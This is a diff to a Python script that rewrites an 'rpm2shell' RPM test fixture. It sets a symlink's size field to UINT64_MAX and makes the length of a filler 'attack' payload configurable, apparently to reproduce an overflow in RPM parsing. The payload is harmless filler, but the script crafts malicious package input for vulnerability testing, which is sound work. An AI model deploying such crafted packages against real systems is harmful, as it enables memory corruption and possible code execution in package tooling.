@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """Patch the safe rpm2shell fixture's symlink size to UINT64_MAX."""
 import hashlib
+import os
 from pathlib import Path
 import stat
 import struct
@@ -185,14 +186,19 @@ def main() -> int:
     if len(sys.argv) == 4:
         Path(sys.argv[3]).write_bytes(blob)
 
-    payload = newc_payload(b"MISHE-RPM!!" + b"A" * 53)
+    total = int(os.environ.get("RPM2SHELL_PAYLOAD_LEN", "64"))
+    marker = b"MISHE-RPM!!"
+    if total < len(marker):
+        raise ValueError(f"payload length {total} < marker length")
+    payload = newc_payload(marker + b"A" * (total - len(marker)))
     refresh(payload)
     struct.pack_into(">Q", blob, size_at, 0xFFFFFFFFFFFFFFFF)
     target.write_bytes(blob)
     print(f"symlink_index={link_index} size_offset={size_at:#x} "
           f"payload_offset={payload_at:#x} old_size={old_size} "
           f"new_size=UINT64_MAX safe_newc_payload={len(safe_payload)} "
-          f"attack_newc_payload={len(payload)}")
+          f"attack_newc_payload={len(payload)} "
+          f"chosen_payload_bytes={total}")
     return 0
 
 
